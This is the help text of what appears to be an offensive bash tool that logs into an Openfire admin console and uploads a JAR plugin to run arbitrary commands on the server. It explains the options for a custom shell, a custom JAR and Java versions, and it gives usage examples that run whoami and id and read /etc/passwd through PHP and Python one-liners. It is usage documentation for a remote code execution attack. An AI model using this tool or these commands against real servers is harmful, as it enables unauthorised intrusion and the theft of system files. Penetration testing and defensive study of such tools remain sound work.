full_help="\
$help
\e[1;33m-----------------------------------------------------------------------------------------------------------------------\e[0m

\e[31m[!]\e[0m NOTES:

Parent parameters (or single ones) can be provided in any order.   Example:  -username 'value' -target_ip 'value' 
Child parameters must always be grouped under their respective parent parameter.   Example:  -windows -command 'value'
Parameters with child parameters can never be used alone.
Values containing spaces must be enclosed in quotes

\e[1;33m------------------------------------------------------------------------------------------------------------------------\e[0m

\e[31m[!]\e[0m About \e[32m-java_version\e[0m:

Sometimes, Openfire administration web interfaces use an old version of Java to compile their JAR plugins
If, for some reason, your jar plugin is not executed, 
you can use different java version using  -java_version 'value'

Check the logs for the reason by using -debug -get_log

\e[1;33m------------------------------------------------------------------------------------------------------------------------\e[0m

\e[31m[!]\e[0m About \e[32m-custom_command\e[0m:

When you specify -command, the default bihavior is that your command is encoded in Base64 
and executed by Bash on Linux or Powershell on Windows

However, sometimes these shells can be restrictive or even unavaliable
in such case, you can craft your own full custom command using:

-windows -custom_command -shell 'value' -switch 'value' -cmd 'value'
OR
-linux -custom_command -shell 'value' -switch 'value' -cmd 'value'


you do not have to specify full path of the chosen shell, 
as it solely depends on the target system.

However, be aware that your custom command is inserted inside java code, 
which is then wrapped in double quotes in a Bash environment.

Therefore, use -debug -print_java_code to inspect and debug if your java code does not compile.

\e[31m[!]\e[0m Search for the line under the initializePlugin method:
String[] cmd = {\"\", \"\", \"\"};

This is where your -shell, -switch, -cmd values are inserted respectively
and executed by Runtime.getRuntime().exec(cmd)

\e[1;33m-------------------------------------------------------------------------------------------------------------------------\e[0m

\e[31m[!]\e[0m About \e[32m-custom_jar\e[0m:

If you will provide jar file of your own
Be aware that this options will not be avaliable:

-java_version

Everything under -debug except -get_log

Everything under -windows or -linux for obvious reasons


\e[1;33m------------------------------------------------------------------------------------------------------------------------\e[0m

\e[31m[!]\e[0m The following parameters are required for successful execution:

-username 'value'
-password 'value'
-target_ip 'value'
-target_port 'value'

In addition, you must specify one of:

-windows -command 'value'
OR
-linux -command 'value'

\e[1;33m--------------------------------------------------------------------------------------------------------------------------\e[0m

\e[31m[!]\e[0m Usage Example:

bash openfire_plugin_upload_curl.sh -username 'admin' -password 'admin' -target http://127.0.0.1:9090 -debug -local_ip 10.10.10.10 -local_port 8081 -get_log -windows -command 'whoami' -proxy http://127.0.0.1:8080

bash openfire_plugin_upload_curl.sh -username 'admin' -password 'admin' -target https://127.0.0.1:9091 -linux -command 'ping -c 4 10.10.10.10' -ssl


\e[31m[!]\e[0m using \e[32m-custom_command\e[0m:

bash openfire_plugin_upload_curl.sh -username 'admin' -password 'admin' -target http://127.0.0.1:9090 -linux -custom_command -cmd 'id' -shell '/bin/sh' -switch '-c' -debug -print_java_code

-linux -custom_command -shell 'php' -switch '-r' -cmd 'echo file_get_contents(\\\"/etc/passwd\\\");'
-windows -custom_command -shell 'C:\\\\\\\\windows\\\\\\\\system32\\\\\\\\cmd.exe' -switch '/c' -cmd 'whoami /all'
-linux -custom_command -shell 'python3' -switch '-c' -cmd 'file = open(\\\"/etc/passwd\\\", \\\"r\\\"); print(file.read());file.close()'


\e[31m[!]\e[0m using \e[32m-custom_jar\e[0m:

bash openfire_plugin_upload_curl.sh -username 'admin' -password 'admin' -target http://127.0.0.1:9090 -custom_jar '/tmp/test.jar'
"

